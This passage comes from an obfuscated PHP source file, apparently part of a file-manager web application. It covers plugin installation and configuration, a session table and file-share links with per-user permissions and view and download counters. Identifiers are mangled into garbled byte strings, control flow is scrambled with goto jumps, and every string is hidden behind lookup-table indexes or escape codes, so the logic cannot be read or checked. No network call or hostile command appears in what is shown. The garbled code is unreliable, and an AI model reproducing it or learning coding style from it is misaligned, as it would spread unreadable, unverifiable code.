$CáÉÔã¢ñ => $aê„ßšö§ò) { Hook::bind($CáÉÔã¢ñ, $aê„ßšö§ò); } } Hook::trigger($eˆ˜¥ÇÜà[2162]); Hook::trigger(ACTION); } public function appAllow($C‰ƒÅó™†é, $E®ÙïÂÛ§Ä, $D››±ôµ÷’ = true) { $Aªİæ°’ê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aç¶ˆÒÍ… = PLUGIN_DIR . $C‰ƒÅó™†é . $Aªİæ°’ê[2163]; if (!is_array($E®ÙïÂÛ§Ä) || !is_array($E®ÙïÂÛ§Ä[$Aªİæ°’ê[2161]]) || !is_file($aç¶ˆÒÍ…) || $E®ÙïÂÛ§Ä[$Aªİæ°’ê[684]] != 1) { return !1; } if ($D››±ôµ÷’ && !Action($Aªİæ°’ê[2164])->checkAuth($C‰ƒÅó™†é)) { return !1; } return !0; } public function unInstall($Aøˆò‰ÅÕ) { $aò†ñŠÀ± =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Bë¤›ùÓò = $this->loadList($Aøˆò‰ÅÕ); if (file_exists(PLUGIN_DIR . $Aøˆò‰ÅÕ)) { Hook::apply($Aøˆò‰ÅÕ . $aò†ñŠÀ±[2165]); } $this->remove($Bë¤›ùÓò[$aò†ñŠÀ±[364]]); } public function changeStatus($fÃ­ ìø†à, $FÚ­²ìØØ´) { $b«ãéİ¨´ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F‘¶Ó·ì„ = $this->loadList($fÃ­ ìø†à); if ($FÚ­²ìØØ´) { Hook::apply($fÃ­ ìø†à . $b«ãéİ¨´[2166]); } $this->update($F‘¶Ó·ì„[$b«ãéİ¨´[364]], array($b«ãéİ¨´[2167] => $FÚ­²ìØØ´)); } public function appRegist($EˆÆîÃÈåÂ, $FŒÈÃ¬³Ÿé) { $B¼¹Òï•® =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cá²‹ùêµ· = $this->loadList($EˆÆîÃÈåÂ); if ($cá²‹ùêµ·) { $this->update($cá²‹ùêµ·[$B¼¹Òï•®[364]], array($B¼¹Òï•®[2161] => $FŒÈÃ¬³Ÿé)); } else { $AºÀùˆ‹ß = array($B¼¹Òï•®[28] => $EˆÆîÃÈåÂ, $B¼¹Òï•®[2161] => $FŒÈÃ¬³Ÿé, $B¼¹Òï•®[684] => 0, $B¼¹Òï•®[6] => $this->getConfigDefault($EˆÆîÃÈåÂ)); $this->insert($AºÀùˆ‹ß); } } public function getConfigDefault($b¸ó°´ÒïŠ) { $C§›Ç«ñ³Ì =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Fõóá¯²‹õ = array(); $Eï•¡’ƒ™ = $this->getPackageJson($b¸ó°´ÒïŠ); if (!$Eï•¡’ƒ™ && is_array($Eï•¡’ƒ™[$C§›Ç«ñ³Ì[2168]])) { return $Fõóá¯²‹õ; } foreach ($Eï•¡’ƒ™[$C§›Ç«ñ³Ì[2168]] as $c¸¾®š‘¯œ => $cºÔÑ†ÎÑ ) { if (!isset($cºÔÑ†ÎÑ [$C§›Ç«ñ³Ì[356]]) || isset($Fõóá¯²‹õ[$c¸¾®š‘¯œ])) { continue; } $Fõóá¯²‹õ[$c¸¾®š‘¯œ] = $cºÔÑ†ÎÑ [$C§›Ç«ñ³Ì[356]]; } return $Fõóá¯²‹õ; } public function getPackageJson($AÈè›Øé‘) { return Hook::apply($AÈè›Øé‘ . $_SERVER[ÚŠ•´ÍéÒÑÔ][2169]); } public function getConfig($c‰ƒÉÅ¯Ëù, $b¯˜œ‰Šê¾ = false) { $EğÃà³«„« =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b†½†©¯õĞ = array(); $b¨£ÖïöÄ = $this->loadList($c‰ƒÉÅ¯Ëù); if ($b¨£ÖïöÄ && is_array($b¨£ÖïöÄ[$EğÃà³«„«[6]])) { $b†½†©¯õĞ = $b¨£ÖïöÄ[$EğÃà³«„«[6]]; } if (!$b†½†©¯õĞ || $b¯˜œ‰Šê¾) { $b†½†©¯õĞ = $this->getConfigDefault($c‰ƒÉÅ¯Ëù); } return $b†½†©¯õĞ; } public function setConfig($D¶¥…‹ÔëÁ, $C‰Ô˜‚Å = false) { goto E¶÷å™Òæ; E¶÷å™Òæ: $d¦ÓÓŒÄØ‡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cßÒƒãˆí¿ = $this->loadList($D¶¥…‹ÔëÁ); if (!$cßÒƒãˆí¿) { return !1; } goto F§¹öŒĞÅÇ; F§¹öŒĞÅÇ: if ($C‰Ô˜‚Å == !1) { $C‰Ô˜‚Å = $this->getConfigDefault($D¶¥…‹ÔëÁ); } $bé“ã‡‚©ì = $cßÒƒãˆí¿[$d¦ÓÓŒÄØ‡[6]]; foreach ($C‰Ô˜‚Å as $f¹ÈœƒÃçå => $Aë¾Â±İáÅ) { $bé“ã‡‚©ì[$f¹ÈœƒÃçå] = is_string($Aë¾Â±İáÅ) ? trim($Aë¾Â±İáÅ) : $Aë¾Â±İáÅ; } goto aéà£¶Å™¨; aéà£¶Å™¨: $this->update($cßÒƒãˆí¿[$d¦ÓÓŒÄØ‡[364]], array($d¦ÓÓŒÄØ‡[6] => $bé“ã‡‚©ì)); goto DøÑ®š î; DøÑ®š î: } public function viewList() { goto A¸»Ò…Æ; dàÇËºØ°Ş: $d¥œ‹èÀØ´ = $this->loadPluginList(); $FôôÁìÎ£“ = array(); foreach ($d¥œ‹èÀØ´ as $E×èÂáåù¢ => $f›Ã™ŠíÚØ) { unset($f›Ã™ŠíÚØ[$cÀĞ£™Óè¯[2161]], $f›Ã™ŠíÚØ[$cÀĞ£™Óè¯[6]]); $BĞùã‹êÄË = PLUGIN_DIR . $f›Ã™ŠíÚØ[$cÀĞ£™Óè¯[28]] . $cÀĞ£™Óè¯[2163]; if (!is_file($BĞùã‹êÄË)) { continue; } $a˜à©ƒĞì = Hook::apply($f›Ã™ŠíÚØ[$cÀĞ£™Óè¯[28]] . $cÀĞ£™Óè¯[2169]); if (is_array($a˜à©ƒĞì)) { $FôôÁìÎ£“[$E×èÂáåù¢] = array_merge($f›Ã™ŠíÚØ, $a˜à©ƒĞì); } } goto DØÍÑçƒ†’; A¸»Ò…Æ: $cÀĞ£™Óè¯ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d¥œ‹èÀØ´ = $this->loadList(); $this->pluginScan($d¥œ‹èÀØ´); goto dàÇËºØ°Ş; DØÍÑçƒ†’: return $FôôÁìÎ£“; goto EÛ®Ş¶ôçÏ; EÛ®Ş¶ôçÏ: } private function loadPluginList() { $AÖÎ”‘Šèô =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EØ§œíÉç™ = $this->loadList(); if (strtolower(MOD) == $AÖÎ”‘Šèô[2170]) { return $EØ§œíÉç™; } $DÎª‚äñ‘ = Hook::trigger($AÖÎ”‘Šèô[2171], $EØ§œíÉç™); if ($EØ§œíÉç™ && !$DÎª‚äñ‘) { die; } return $DÎª‚äñ‘ ? $DÎª‚äñ‘ : $EØ§œíÉç™; } private function pluginScan($Eâ¦‚›ÛÆ•) { $Fö‰äòî¥Ç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; recursion_dir(PLUGIN_DIR, $A‘º‰×Ë”ê, $eğòºø, 0); foreach ($A‘º‰×Ë”ê as $D¤÷éĞÕâ©) { $Eğ¼õÙ‰ = get_path_this($D¤÷éĞÕâ©); if (isset($Eâ¦‚›ÛÆ•[$Eğ¼õÙ‰]) || !file_exists($D¤÷éĞÕâ© . $Fö‰äòî¥Ç[2172]) || !file_exists($D¤÷éĞÕâ© . $Fö‰äòî¥Ç[2163])) { continue; } Hook::apply($Eğ¼õÙ‰ . $Fö‰äòî¥Ç[2166]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\x6d\x5f\x73\145\163\x73\151\157\x6e"; public function get($aÕ„éŒÇé) { $eÍáÅÕÊ¯· =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aôî¹å’Èä = $this->where(array($eÍáÅÕÊ¯·[2173] => $aÕ„éŒÇé))->find(); if (!is_array($aôî¹å’Èä)) { return !1; } return $aôî¹å’Èä[$eÍáÅÕÊ¯·[687]]; } public function set($F¦ƒ±ÍËé, $bÄ®®’É«, $DÜË‘ó…ë™ = 3600) { $Dï®ŠíŞš =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÃ‰´Ö´†Ø = array($Dï®ŠíŞš[2173] => $F¦ƒ±ÍËé, $Dï®ŠíŞš[2102] => $bÄ®®’É«, $Dï®ŠíŞš[2174] => $DÜË‘ó…ë™ + time()); if (Session::get($Dï®ŠíŞš[2175])) { $AÃ‰´Ö´†Ø[$Dï®ŠíŞš[1409]] = Session::get($Dï®ŠíŞš[2175]); } else { $AÃ‰´Ö´†Ø[$Dï®ŠíŞš[1409]] = 0; } if ($this->get($F¦ƒ±ÍËé)) { return $this->where(array($Dï®ŠíŞš[2173] => $F¦ƒ±ÍËé))->save($AÃ‰´Ö´†Ø); } else { return $this->add($AÃ‰´Ö´†Ø, array(), !0); } } public function remove($bÅ¡½ÆÃ¯‰) { return $this->where(array($_SERVER[ÚŠ•´ÍéÒÑÔ][2173] => $bÅ¡½ÆÃ¯‰))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ÚŠ•´ÍéÒÑÔ][2176] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\145"; protected $dataAuto = array(array("\155\157\144\x69\x66\171\x54\151\155\145", "\164\151\x6d\x65", "\151\156\x73\145\x72\164\x2c\x75\160\144\x61\164\145", "\146\x75\156\x63\164\151\x6f\156"), array("\x63\x72\x65\141\x74\145\x54\151\155\145", "\x74\151\x6d\145", "\x69\x6e\163\145\x72\x74", "\x66\x75\156\x63\x74\151\x6f\x6e"), array("\157\160\164\x69\x6f\156\x73", '', "\151\156\x73\145\x72\164\x2c\x75\x70\x64\x61\164\145\54\x73\145\x6c\145\x63\x74", "\x6a\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($aÏŒ¿Çñ›Â) { $A¥ËæØçè =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E¾«Ûí‰„ = isset($aÏŒ¿Çñ›Â[0]) ? $aÏŒ¿Çñ›Â[0] : !1; return array($A¥ËæØçè[2177] => array(USER_ID, $A¥ËæØçè[2178]), $A¥ËæØçè[2140] => array($E¾«Ûí‰„, $A¥ËæØçè[2179])); } protected function listSimple() { $D‚äéÅİ£• = array($_SERVER[ÚŠ•´ÍéÒÑÔ][1409] => USER_ID); $e¾Ìé´ë˜« = $this->field($this->fieldList)->where($D‚äéÅİ£•)->select(); return $e¾Ìé´ë˜« ? $e¾Ìé´ë˜« : array(); } protected function getInfo($b´„Ş··ù´, $bÚôÜÃ¬„å = false) { $Dš©·š¨ç• =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($bÚôÜÃ¬„å) { return $this->_getShareInfo(array($Dš©·š¨ç•[437] => $b´„Ş··ù´)); } $fÔ¬ß¨²Â´ = $this->cacheFunctionGet($Dš©·š¨ç•[2180], $b´„Ş··ù´); return $fÔ¬ß¨²Â´; } public function getInfoByHash($f†˜é™ËÆ´) { return $this->_getShareInfo(array($_SERVER[ÚŠ•´ÍéÒÑÔ][439] => $f†˜é™ËÆ´)); } public function getInfoByPath($D÷œßĞ¢Èì) { $bÎàÅó°«» =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BÜ•Å‡§‹‚ = array($bÎàÅó°«»[1409] => USER_ID, $bÎàÅó°«»[366] => $D÷œßĞ¢Èì); return $this->_getShareInfo($BÜ•Å‡§‹‚); } public function getInfoBySourcePath($A‘Ãµ“·é›) { $FİÓ´¤òÀ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eÈ¯©¿„„² = array($FİÓ´¤òÀ[1409] => USER_ID, $FİÓ´¤òÀ[1010] => $A‘Ãµ“·é›); return $this->_getShareInfo($eÈ¯©¿„„²); } private function _getShareInfo($Aâå¡¶·ä½) { goto b™„Ö¥È¡Í; F¶Õ•Ã‡å: $Aâå¡¶·ä½ = array($bÛ§«©²Çö[437] => $fê’Š‰Å‡[$bÛ§«©²Çö[437]]); $cŒ«¤’©¢ = $bÛ§«©²Çö[2181]; $c¥âŠµöš = Model($bÛ§«©²Çö[533])->order($bÛ§«©²Çö[364])->field($cŒ«¤’©¢)->where($Aâå¡¶·ä½)->select(); goto eˆÈÀÆ‚‘ô; eˆÈÀÆ‚‘ô: if ($fê’Š‰Å‡[$bÛ§«©²Çö[366]] == $bÛ§«©²Çö[464]) { $fê’Š‰Å‡[$bÛ§«©²Çö[388]] = IO::info($fê’Š‰Å‡[$bÛ§«©²Çö[1010]]); } else { $fê’Š‰Å‡[$bÛ§«©²Çö[388]] = Model($bÛ§«©²Çö[1102])->pathInfo($fê’Š‰Å‡[$bÛ§«©²Çö[366]]); } $fê’Š‰Å‡[$bÛ§«©²Çö[2182]] = $c¥âŠµöš; return $fê’Š‰Å‡; goto EÃ£Ó“ƒ; b™„Ö¥È¡Í: $bÛ§«©²Çö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fê’Š‰Å‡ = $this->where($Aâå¡¶·ä½)->find(); if (!$fê’Š‰Å‡) { return !1; } goto F¶Õ•Ã‡å; EÃ£Ó“ƒ: } protected function getInfoAuth($Fˆœ«Á¨‹) { $D†ïÃÚâ‚° =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CâÂ¸ÄºÏë = $this->getInfo($Fˆœ«Á¨‹); $CâÂ¸ÄºÏë[$D†ïÃÚâ‚°[373]] = Model($D†ïÃÚâ‚°[450])->authMake($CâÂ¸ÄºÏë[$D†ïÃÚâ‚°[2182]]); return $CâÂ¸ÄºÏë; } protected function listData($AĞÀÆ÷õì¥ = null, $DÄÎ‘÷°£Š = 300) { $cåæñ´«öÆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DêØÀœ…»ó = array(array($cåæñ´«öÆ[442] => array($cåæñ´«öÆ[920], 0), $cåæñ´«öÆ[444] => array($cåæñ´«öÆ[920], 0), $cåæñ´«öÆ[2183] => $cåæñ´«öÆ[2152])); if ($AĞÀÆ÷õì¥ == $cåæñ´«öÆ[1839]) { $DêØÀœ…»ó = array($cåæñ´«öÆ[442] => 1); } else { if ($AĞÀÆ÷õì¥ == $cåæñ´«öÆ[999]) { $DêØÀœ…»ó = array($cåæñ´«öÆ[444] => 1); } } $DêØÀœ…»ó[$cåæñ´«öÆ[1409]] = USER_ID; $F˜ó‚°Å¨Ó = $this->where($DêØÀœ…»ó)->selectPage($DÄÎ‘÷°£Š); return $F˜ó‚°Å¨Ó; } protected function listToMe($e“˜Ô¯Ü¢ = 300) { goto B­Æ¯É…Ô; DµŒØ‹¦ÈŠ: $EöïÑíâ¼ã = array($C¶Ö‰’»é[517] => SourceModel::TYPE_USER, $C¶Ö‰’»é[452] => USER_ID); if ($E§¨…ÁÄÁœ) { $EöïÑíâ¼ã = array(array($C¶Ö‰’»é[517] => SourceModel::TYPE_USER, $C¶Ö‰’»é[452] => USER_ID), array($C¶Ö‰’»é[517] => SourceModel::TYPE_GROUP, $C¶Ö‰’»é[452] => array($C¶Ö‰’»é[7], $E§¨…ÁÄÁœ)), $C¶Ö‰’»é[2183] => $C¶Ö‰’»é[2152]); } $fŸº•Ğ±£ = Model($C¶Ö‰’»é[533])->where($EöïÑíâ¼ã)->selectPage($e“˜Ô¯Ü¢); goto CŒİø‰ªÁ; d²…ƒÚÃµİ: $Fã·“Û¶ƒ = array($C¶Ö‰’»é[2186] => $EÑ§ôØÙàŒ, $C¶Ö‰’»é[2187] => $fŸº•Ğ±£[$C¶Ö‰’»é[348]]); return $Fã·“Û¶ƒ; goto d„˜¢º‹Åé; B­Æ¯É…Ô: $C¶Ö‰’»é =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Bâ¥óÀª¥ = Session::get($C¶Ö‰’»é[2184]); $E§¨…ÁÄÁœ = array_to_keyvalue($Bâ¥óÀª¥, $C¶Ö‰’»é[33], $C¶Ö‰’»é[2072]); goto DµŒØ‹¦ÈŠ; b£Ú°¦‡İ: $EöïÑíâ¼ã = array($C¶Ö‰’»é[437] => array($C¶Ö‰’»é[381], array_keys($bå›„ˆ’))); $EÑ§ôØÙàŒ = $this->field($Dƒ·íå™ó‘)->where($EöïÑíâ¼ã)->select(); foreach ($EÑ§ôØÙàŒ as $a è³ÀÎæŒ => &$eÅï„Áù‘Ä) { $eÅï„Áù‘Ä[$C¶Ö‰’»é[2182]] = $bå›„ˆ’[$eÅï„Áù‘Ä[$C¶Ö‰’»é[437]]]; } goto d²…ƒÚÃµİ; CŒİø‰ªÁ: $bå›„ˆ’ = array_to_keyvalue_group($fŸº•Ğ±£[$C¶Ö‰’»é[351]], $C¶Ö‰’»é[437]); if (!$bå›„ˆ’) { return $fŸº•Ğ±£; } $Dƒ·íå™ó‘ = $C¶Ö‰’»é[2185]; goto b£Ú°¦‡İ; d„˜¢º‹Åé: } protected function shareAdd($FÛ¯àì¤ƒ, $A¡‚µÎŠ­Ÿ) { $f·î›Ğ÷–² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EŠÃ––¯˜˜ = $this->_addShareData($FÛ¯àì¤ƒ, $A¡‚µÎŠ­Ÿ); if (!empty($A¡‚µÎŠ­Ÿ[$f·î›Ğ÷–²[2188]])) { $this->_shareAuthSet($EŠÃ––¯˜˜, $A¡‚µÎŠ­Ÿ[$f·î›Ğ÷–²[2188]]); } $this->shareEventAdd($FÛ¯àì¤ƒ, $A¡‚µÎŠ­Ÿ, $f·î›Ğ÷–²[1002]); return $EŠÃ––¯˜˜; } private function shareEventAdd($c†ÛÙ˜šÅ, $Aô‡ˆ¢ÓĞ, $EİÏö„È²ê = "\141\x64\144") { goto fŒÔù¦Ü; Dô ÆØ•ƒ: $DØ×˜Ø„® = $cºÆÙÚ±åÎ[2191]; if ($Bğ„—Ñ˜˜š[$cºÆÙÚ±åÎ[442]] == $cºÆÙÚ±åÎ[464] && $Aô‡ˆ¢ÓĞ[$cºÆÙÚ±åÎ[442]] == $cºÆÙÚ±åÎ[83]) { $DØ×˜Ø„® = $cºÆÙÚ±åÎ[2189]; } if ($Bğ„—Ñ˜˜š[$cºÆÙÚ±åÎ[442]] == $cºÆÙÚ±åÎ[83] && $Aô‡ˆ¢ÓĞ[$cºÆÙÚ±åÎ[442]] == $cºÆÙÚ±åÎ[464]) { $DØ×˜Ø„® = $cºÆÙÚ±åÎ[2192]; } goto BœÉ§Åõß; FÇÅÅ„æ £: return; goto Bº¬¾Òš¦ô; fŒÔù¦Ü: $cºÆÙÚ±åÎ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($EİÏö„È²ê == $cºÆÙÚ±åÎ[1002]) { if ($Aô‡ˆ¢ÓĞ[$cºÆÙÚ±åÎ[442]] == $cºÆÙÚ±åÎ[83]) { Model($cºÆÙÚ±åÎ[501])->eventShare($c†ÛÙ˜šÅ, $cºÆÙÚ±åÎ[2189]); } if ($Aô‡ˆ¢ÓĞ[$cºÆÙÚ±åÎ[444]] == $cºÆÙÚ±åÎ[83]) { Model($cºÆÙÚ±åÎ[501])->eventShare($c†ÛÙ˜šÅ, $cºÆÙÚ±åÎ[2190]); } return; } $Bğ„—Ñ˜˜š = $this->getInfoByPath($c†ÛÙ˜šÅ); goto Dô ÆØ•ƒ; BœÉ§Åõß: if ($Bğ„—Ñ˜˜š[$cºÆÙÚ±åÎ[444]] == $cºÆÙÚ±åÎ[464] && $Aô‡ˆ¢ÓĞ[$cºÆÙÚ±åÎ[444]] == $cºÆÙÚ±åÎ[83]) { $DØ×˜Ø„® = $cºÆÙÚ±åÎ[2190]; } if ($Bğ„—Ñ˜˜š[$cºÆÙÚ±åÎ[444]] == $cºÆÙÚ±åÎ[83] && $Aô‡ˆ¢ÓĞ[$cºÆÙÚ±åÎ[444]] == $cºÆÙÚ±åÎ[464]) { $DØ×˜Ø„® = $cºÆÙÚ±åÎ[2193]; } Model($cºÆÙÚ±åÎ[501])->eventShare($c†ÛÙ˜šÅ, $DØ×˜Ø„®); goto FÇÅÅ„æ £; Bº¬¾Òš¦ô: } private function _addShareData($D©®ï½àÍ, $b¡•¡™Û…ß = array()) { goto CòÛ¥„’½; cåÄãôÂµ: $b›ÇÃŒæ“¤ = $this->add($eÙÏ’‹¹ù); $d«Ú¸éÛº = array($aø¬–•ò½À[439] => short_id($b›ÇÃŒæ“¤)); $this->where(array($aø¬–•ò½À[436] => $b›ÇÃŒæ“¤))->save($d«Ú¸éÛº); goto EÃº»¨Ü¬ç; aÉ¯‚®çò¼: if ($AªÙğøÜª· = $this->where($c°“„ŞØ×¤)->find()) { return $AªÙğøÜª·[$aø¬–•ò½À[437]]; } if ($D©®ï½àÍ == 0) { $fÖêŞöŸ©‡ = array($aø¬–•ò½À[28] => get_path_this($b¡•¡™Û…ß[$aø¬–•ò½À[75]])); } else { $fÖêŞöŸ©‡ = Model($aø¬–•ò½À[747])->sourceInfo($D©®ï½àÍ); if (!$fÖêŞöŸ©‡) { return !1; } } if (!$b¡•¡™Û…ß[$aø¬–•ò½À[1316]]) { $b¡•¡™Û…ß[$aø¬–•ò½À[1316]] = $fÖêŞöŸ©‡[$aø¬–•ò½À[28]]; } goto Eô»ßÒÊ”ã; Eô»ßÒÊ”ã: $eÙÏ’‹¹ù = array($aø¬–•ò½À[1400] => USER_ID, $aø¬–•ò½À[380] => $D©®ï½àÍ, $aø¬–•ò½À[1316] => $aø¬–•ò½À[33], $aø¬–•ò½À[442] => 0, $aø¬–•ò½À[444] => 0, $aø¬–•ò½À[1010] => $aø¬–•ò½À[33], $aø¬–•ò½À[292] => $aø¬–•ò½À[33], $aø¬–•ò½À[796] => $aø¬–•ò½À[33], $aø¬–•ò½À[2195] => 0, $aø¬–•ò½À[2196] => 0, $aø¬–•ò½À[698] => 0, $aø¬–•ò½À[2197] => $aø¬–•ò½À[33], $aø¬–•ò½À[439] => $aø¬–•ò½À[33]); $aÖ…‹§æŠ = explode($aø¬–•ò½À[47], $aø¬–•ò½À[2198]); foreach ($aÖ…‹§æŠ as $e³°ï™àÔ¶) { if (!isset($b¡•¡™Û…ß[$e³°ï™àÔ¶])) { continue; } $eÙÏ’‹¹ù[$e³°ï™àÔ¶] = $b¡•¡™Û…ß[$e³°ï™àÔ¶]; } goto cåÄãôÂµ; EÃº»¨Ü¬ç: return $b›ÇÃŒæ“¤; goto eĞƒ†õ¡Œâ; CòÛ¥„’½: $aø¬–•ò½À =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c°“„ŞØ×¤ = array($aø¬–•ò½À[380] => $D©®ï½àÍ, $aø¬–•ò½À[1400] => USER_ID); if ($D©®ï½àÍ == 0) { $c°“„ŞØ×¤ = array($aø¬–•ò½À[2194] => $b¡•¡™Û…ß[$aø¬–•ò½À[1010]], $aø¬–•ò½À[1400] => USER_ID); } goto aÉ¯‚®çò¼; eĞƒ†õ¡Œâ: } private function _shareAuthSet($BôŸ»Ä¹, $b’‚°‰øé´) { goto c¬×¤ÔƒÇ¡; fä˜æÙ©ø—: $b‡÷îİ½Ñâ->where(array($fîª±ÅáùŒ[437] => $BôŸ»Ä¹))->delete(); $Dè»…‘¬î÷ = array(); foreach ($b’‚°‰øé´ as $CÌÔ§£¨áğ) { $aÅÈóñæÂó = SourceModel::TYPE_USER; if ($CÌÔ§£¨áğ[$fîª±ÅáùŒ[368]] == SourceModel::TYPE_GROUP) { $aÅÈóñæÂó = SourceModel::TYPE_GROUP; } $Eà“Ú¬Íâƒ = array($fîª±ÅáùŒ[437] => $BôŸ»Ä¹, $fîª±ÅáùŒ[368] => $aÅÈóñæÂó, $fîª±ÅáùŒ[452] => intval($CÌÔ§£¨áğ[$fîª±ÅáùŒ[452]]), $fîª±ÅáùŒ[2200] => 0, $fîª±ÅáùŒ[2201] => -1); if ($CÌÔ§£¨áğ[$fîª±ÅáùŒ[2200]]) { $Eà“Ú¬Íâƒ[$fîª±ÅáùŒ[2200]] = $CÌÔ§£¨áğ[$fîª±ÅáùŒ[2200]]; } else { if ($CÌÔ§£¨áğ[$fîª±ÅáùŒ[2201]]) { $Eà“Ú¬Íâƒ[$fîª±ÅáùŒ[2201]] = $CÌÔ§£¨áğ[$fîª±ÅáùŒ[2201]]; } } $Dè»…‘¬î÷[] = $Eà“Ú¬Íâƒ; } goto A‘µµÅ¦Õ; c¬×¤ÔƒÇ¡: $fîª±ÅáùŒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!is_array($b’‚°‰øé´)) { return !1; } $b‡÷îİ½Ñâ = Model($fîª±ÅáùŒ[2199]); goto fä˜æÙ©ø—; A‘µµÅ¦Õ: return $b‡÷îİ½Ñâ->addAll($Dè»…‘¬î÷, array(), !0); goto EƒùİöÁæ; EƒùİöÁæ: } public function numViewAdd($fÌˆ‚ÁøŠ) { $dÇáÜ°¸Î =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e©”ñî÷î¼ = array($dÇáÜ°¸Î[436] => $fÌˆ‚ÁøŠ); $this->where($e©”ñî÷î¼)->setAdd($dÇáÜ°¸Î[2195]); } public function numDownloadAdd($c³ªÊè‘) { $DÌèªÄÓ¢ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E¡Ûòò†éÃ = array($DÌèªÄÓ¢[436] => $c³ªÊè‘); $this->where($E¡Ûòò†éÃ)->setAdd($DÌèªÄÓ¢[2196]); } protected function shareEdit($bæ‡ó¦İÀ, $eè‚Æ—¿ë‹) { goto CäÒÁÆÛù; F˜àÚÒùïƒ: $this->_checkLinkShare($eè‚Æ—¿ë‹, $b”ÕØÔ³ÙĞ); $e¬ƒ†°åÇ¯ = array(); $Cƒ¡ğí´ò = explode($f®§…ô·Ñ[47], $f®§…ô·Ñ[2202]); goto A©ØÖà¥¢’; A©ØÖà¥¢’: foreach ($Cƒ¡ğí´ò as $cìœŸœÕò’) { if (!array_key_exists($cìœŸœÕò’, $eè‚Æ—¿ë‹)) { continue; } $e¬ƒ†°åÇ¯[$cìœŸœÕò’] = $eè‚Æ—¿ë‹[$cìœŸœÕò’]; } $this->shareEventAdd($b”ÕØÔ³ÙĞ[$f®§…ô·Ñ[366]], $eè‚Æ—¿ë‹, $f®§…ô·Ñ[2040]); $this->where(array($f®§…ô·Ñ[436] => $bæ‡ó¦İÀ))->save($e¬ƒ†°åÇ¯); goto E Ì‡¡´²¬; E Ì‡¡´²¬: if (isset($eè‚Æ—¿ë‹[$f®§…ô·Ñ[2188]])) { $this->_shareAuthSet($bæ‡ó¦İÀ, $eè‚Æ—¿ë‹[$f®§…ô·Ñ[2188]]); } return !0; goto cÌƒÑÙ¤Ñ’; CäÒÁÆÛù: $f®§…ô·Ñ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b”ÕØÔ³ÙĞ = $this->getInfo($bæ‡ó¦İÀ); if (!$b”ÕØÔ³ÙĞ) { return !1; } goto F˜àÚÒùïƒ; cÌƒÑÙ¤Ñ’: } private function _checkLinkShare($FÍ“êÇŒè, $B©Æ¸ò¼³) { goto BÑ¨´ÃÓº; E«ÕÑÖİÊĞ: if ($B©Æ¸ò¼³[$bİªøš‘Ø[388]][$bİªøš‘Ø[29]] != $bİªøš‘Ø[164]) { $bÂ©èËì¯ = $this->_folderReport($eÓ¥²ÖØ•™); if (!$bÂ©èËì¯) { return; } show_json(LNG($bİªøš‘Ø[2203]) . $bİªøš‘Ø[2204] . $bÂ©èËì¯, !1); } $B­†ÕË±­„ = Model($bİªøš‘Ø[747])->fileInfoGet($B©Æ¸ò¼³[$bİªøš‘Ø[388]][$bİªøš‘Ø[366]]); if (!$B­†ÕË±­„) { return; } goto B„¤·•£‘¹; B„¤·•£‘¹: $FÏˆ¿†Ëèî = $this->shareFileMeta($B­†ÕË±­„[$bİªøš‘Ø[415]]); if (isset($FÏˆ¿†Ëèî[$bİªøš‘Ø[356]]) && $FÏˆ¿†Ëèî[$bİªøš‘Ø[356]] == $bİªøš‘Ø[83]) { show_json(LNG($bİªøš‘Ø[2205]), !1); } goto d½Ğ“§²…Û; BÑ¨´ÃÓº: $bİªøš‘Ø =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($FÍ“êÇŒè[$bİªøš‘Ø[442]] != $bİªøš‘Ø[83]) { return; } $eÓ¥²ÖØ•™ = $B©Æ¸ò¼³[$bİªøš‘Ø[388]][$bİªøš‘Ø[366]]; goto E«ÕÑÖİÊĞ; d½Ğ“§²…Û: } private function _folderReport($cíé†‰œ) { goto A¾×Å‹åÅÈ; A¾×Å‹åÅÈ: $b©ÂÁ›ô‚¼ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A©‡îİšºÜ = array($b©ÂÁ›ô‚¼[415] => array($b©ÂÁ›ô‚¼[920], 0), $b©ÂÁ›ô‚¼[684] => 3); $aİ¹ÎÅ‚ì» = Model($b©ÂÁ›ô‚¼[2206])->where($A©‡îİšºÜ)->field($b©ÂÁ›ô‚¼[415])->select(); goto côù¿‚‘®; côù¿‚‘®: if (!$aİ¹ÎÅ‚ì») { return !1; } $aİ¹ÎÅ‚ì» = array_to_keyvalue($aİ¹ÎÅ‚ì», $b©ÂÁ›ô‚¼[33], $b©ÂÁ›ô‚¼[415]); $cê½æòëÃ = $b©ÂÁ›ô‚¼[47] . $cíé†‰œ . $b©ÂÁ›ô‚¼[47]; goto FÂğğÆùƒ; E²Íö‰ã±›: $bÚËÔŠŒãº = substr($aÇ¦¨„ï‚[$b©ÂÁ›ô‚¼[455]], strpos($aÇ¦¨„ï‚[$b©ÂÁ›ô‚¼[455]], $cê½æòëÃ)); 